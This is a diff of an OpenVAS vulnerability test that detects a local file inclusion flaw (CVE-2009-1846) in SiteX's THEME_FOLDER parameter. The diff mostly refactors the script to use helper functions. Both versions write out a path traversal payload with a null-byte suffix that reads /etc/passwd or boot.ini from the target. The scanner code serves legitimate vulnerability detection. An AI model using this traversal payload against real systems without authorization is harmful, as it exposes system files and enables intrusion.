@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: SiteX_35122.nasl 5401 2017-02-23 09:46:07Z teissa $
+# $Id: SiteX_35122.nasl 5761 2017-03-29 10:54:12Z cfi $
 #
 # SiteX 'THEME_FOLDER' Parameter Multiple Local File Include Vulnerabilities
 #
@@ -34,26 +34,22 @@ application and the computer; other attacks are also possible.
 
 SiteX 0.7.4.418 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100454);
- script_version("$Revision: 5401 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-23 10:46:07 +0100 (Thu, 23 Feb 2017) $");
+ script_version("$Revision: 5761 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:54:12 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-01-20 10:52:14 +0100 (Wed, 20 Jan 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1846");
  script_bugtraq_id(35122);
-
  script_name("SiteX 'THEME_FOLDER' Parameter Multiple Local File Include Vulnerabilities");
-
-
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -64,39 +60,32 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
+include("host_details.inc");
 
-if(!get_port_state(port))exit(0);
+port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/sitex","/cms",cgi_dirs());
+files = traversal_files();
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/login.php"); 
-  req = http_get(item:url, port:port);
-  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
+foreach dir( make_list_unique( "/sitex", "/cms", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+  url = dir + "/login.php";
+  buf = http_get_cache(item:url, port:port);
   if( buf == NULL )continue;
 
   if(egrep(pattern: "Powered by.*SiteX", string: buf, icase: TRUE)) {
   
-    foreach file (make_list("etc/passwd", "boot.ini")) {
+    foreach file (keys(files)) {
 
-      url = string(dir, "/themes/Corporate/homepage.php?THEME_FOLDER=../../../../../../",file,"%00");
-      req = http_get(item:url, port:port);
-      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-      if( buf == NULL )continue;
-
-      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {
-
-        security_message(port:port);
-        exit(0);
-
-      }	
-    } 
+      url = string(dir, "/themes/Corporate/homepage.php?THEME_FOLDER=../../../../../../",files[file],"%00");
+      if(http_vuln_check(port:port, url:url,pattern:file)) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
+exit( 99 );
